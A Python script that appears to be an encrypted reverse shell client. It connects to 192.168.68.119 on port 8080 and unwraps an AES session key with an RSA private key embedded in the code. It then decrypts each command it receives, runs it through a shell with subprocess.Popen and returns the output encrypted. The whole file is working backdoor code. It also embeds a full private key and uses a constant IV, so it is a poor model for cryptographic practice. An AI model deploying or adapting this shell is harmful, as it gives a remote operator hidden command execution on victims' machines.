import subprocess
import socket
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding




def AESFunc(data):
    privatekey = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""
    privateKeyAfterImporrt = RSA.importKey(privatekey)
    decryptoMe = PKCS1_OAEP.new(privateKeyAfterImporrt)
    return decryptoMe.decrypt(data).decode()


def encrypt(message):
    encryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message


def decrypt(data):
    decryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(data)
    decrypted_message = Padding.unpad(decrypted_padded_message,16)
    return decrypted_message


def connect():
    s = socket.socket()
    s.connect(('192.168.68.119', 8080))
    global AES_KEY
    AES_KEY = s.recv(1024)
    AES_KEY = AESFunc(AES_KEY)
    AES_KEY = AES_KEY.encode()
    print(AES_KEY)

    while True:
        command = s.recv(1024)

        command = decrypt(command).decode()
        print(command)
        if 'terminate' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            result = CMD.stdout.read()
            s.send(encrypt(result))

IV = b"H" * 16
connect()

